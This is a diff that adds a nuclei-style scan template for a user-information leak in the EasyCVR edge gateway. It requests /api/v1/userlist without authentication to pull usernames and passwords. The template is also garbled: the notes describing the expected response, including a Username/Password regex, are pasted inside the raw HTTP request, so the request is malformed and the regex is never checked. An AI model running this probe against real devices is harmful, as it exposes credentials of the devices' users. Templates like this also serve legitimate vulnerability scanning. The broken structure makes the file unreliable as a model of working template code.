@@ -1,0 +1,34 @@
+id: poc-pce6gbafik91vg9t
+info:
+  name: EasyCVR智能边缘网关用户信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pce6gbafik91vg9t'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pce6gbafik91vg9t
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?Username)(?=.*?Password).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
